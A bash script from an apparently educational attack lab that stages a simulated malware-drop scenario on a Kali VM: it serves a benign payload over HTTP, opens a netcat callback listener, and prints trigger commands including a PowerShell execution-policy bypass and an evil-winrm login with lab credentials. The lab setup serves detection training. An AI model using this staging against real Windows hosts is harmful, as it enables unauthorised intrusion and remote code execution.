#!/bin/bash
# =============================================================================
# AegisRange — Scenario 2: Kali-Side Attack Orchestration
# =============================================================================
# EDUCATIONAL USE ONLY — Run exclusively in the AegisRange isolated lab.
#
# This script runs on the Kali attacker to set up infrastructure for Scenario 2:
#   1. Starts a Python HTTP server to host the (benign) payload
#   2. Starts a netcat listener to receive the callback
#   3. Provides instructions to trigger the dropper on Windows
#
# Prerequisites:
#   - Run from aegis-kali (10.10.10.10)
#   - Benign payload compiled at /opt/aegisrange/payloads/payload.exe
#   - Tools: python3, netcat
# =============================================================================

set -uo pipefail

# --- Configuration ---
TARGET="10.10.10.30"
ATTACKER_IP="10.10.10.10"
HTTP_PORT=8080
CALLBACK_PORT=4444
PAYLOAD_DIR="/opt/aegisrange/payloads"
LOG_DIR="/opt/aegisrange/logs/scenario2"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"

# --- Setup ---
mkdir -p "${LOG_DIR}"

echo "============================================"
echo "  AegisRange — Scenario 2: File Execution"
echo "  Target  : ${TARGET} (Windows)"
echo "  Attacker: ${ATTACKER_IP} (Kali)"
echo "  Time    : $(date)"
echo "============================================"
echo ""

# --- Pre-flight checks ---
echo "[*] Pre-flight checks..."

if [ ! -f "${PAYLOAD_DIR}/payload.exe" ]; then
    echo "[-] Payload not found at ${PAYLOAD_DIR}/payload.exe"
    echo "[*] Building benign payload..."
    mkdir -p "${PAYLOAD_DIR}"
    cat > "${PAYLOAD_DIR}/payload.c" << 'PAYLOADEOF'
#include <stdio.h>
int main() {
    printf("AegisRange: Simulated payload executed successfully.\n");
    printf("This is a benign binary for educational purposes.\n");
    return 0;
}
PAYLOADEOF
    # Cross-compile for Windows using mingw if available, otherwise create a dummy
    if command -v x86_64-w64-mingw32-gcc &> /dev/null; then
        x86_64-w64-mingw32-gcc "${PAYLOAD_DIR}/payload.c" -o "${PAYLOAD_DIR}/payload.exe"
        echo "[+] Payload cross-compiled for Windows."
    else
        # Create a simple text-based placeholder
        echo "AegisRange: Simulated payload" > "${PAYLOAD_DIR}/payload.exe"
        echo "[!] mingw not available. Created placeholder payload."
        echo "[!] Install mingw for proper Windows binary: apt-get install gcc-mingw-w64"
    fi
fi

echo "[+] Payload ready: ${PAYLOAD_DIR}/payload.exe"
echo ""

# --- Cleanup function ---
cleanup() {
    echo ""
    echo "[*] Cleaning up..."
    [ -n "${HTTP_PID:-}" ] && kill "${HTTP_PID}" 2>/dev/null && echo "[+] HTTP server stopped."
    [ -n "${NC_PID:-}" ] && kill "${NC_PID}" 2>/dev/null && echo "[+] Callback listener stopped."
    echo "[+] Cleanup complete."
}
trap cleanup EXIT

# =============================================================================
# Step 1: Start HTTP server to host the payload
# =============================================================================
echo "===== Step 1: HTTP Server ====="
echo "[*] Starting HTTP server on ${ATTACKER_IP}:${HTTP_PORT}..."
echo "[*] Serving files from: ${PAYLOAD_DIR}"

cd "${PAYLOAD_DIR}"
python3 -m http.server ${HTTP_PORT} --bind ${ATTACKER_IP} \
    > "${LOG_DIR}/http_server_${TIMESTAMP}.log" 2>&1 &
HTTP_PID=$!

sleep 1

if kill -0 "${HTTP_PID}" 2>/dev/null; then
    echo "[+] HTTP server started (PID: ${HTTP_PID})"
    echo "[+] Payload URL: http://${ATTACKER_IP}:${HTTP_PORT}/payload.exe"
else
    echo "[-] HTTP server failed to start. Check port ${HTTP_PORT}."
    exit 1
fi
echo ""

# =============================================================================
# Step 2: Start callback listener
# =============================================================================
echo "===== Step 2: Callback Listener ====="
echo "[*] Starting netcat listener on ${ATTACKER_IP}:${CALLBACK_PORT}..."

nc -nlvp ${CALLBACK_PORT} > "${LOG_DIR}/callback_${TIMESTAMP}.log" 2>&1 &
NC_PID=$!

sleep 1

if kill -0 "${NC_PID}" 2>/dev/null; then
    echo "[+] Callback listener started (PID: ${NC_PID})"
else
    echo "[-] Callback listener failed to start. Check port ${CALLBACK_PORT}."
    exit 1
fi
echo ""

# =============================================================================
# Step 3: Trigger instructions
# =============================================================================
echo "===== Step 3: Trigger the Attack ====="
echo ""
echo "  The attacker infrastructure is ready. Now trigger the dropper on Windows."
echo ""
echo "  ┌─────────────────────────────────────────────────────────────────┐"
echo "  │ OPTION A: Run directly on the Windows target                   │"
echo "  │                                                                │"
echo "  │   powershell.exe -ExecutionPolicy Bypass -File                 │"
echo "  │     C:\\vagrant\\attacks\\scenario2-malicious-exec\\payload-dropper.ps1 │"
echo "  │                                                                │"
echo "  │ OPTION B: Use Evil-WinRM from this Kali machine                │"
echo "  │                                                                │"
echo "  │   evil-winrm -i ${TARGET} -u labuser -p 'LabPass123!'          │"
echo "  │   Then run the PowerShell script within the session.           │"
echo "  └─────────────────────────────────────────────────────────────────┘"
echo ""
echo "[*] Waiting for callback on port ${CALLBACK_PORT}..."
echo "[*] Press Ctrl+C when done."
echo ""

# Wait for the callback listener to receive a connection or user interrupts
wait ${NC_PID} 2>/dev/null

echo ""
echo "[+] Callback received! Check: ${LOG_DIR}/callback_${TIMESTAMP}.log"
echo ""
echo "============================================"
echo "  Scenario 2 Infrastructure Complete"
echo "  Check Sysmon logs and Aegis dashboard"
echo "============================================"
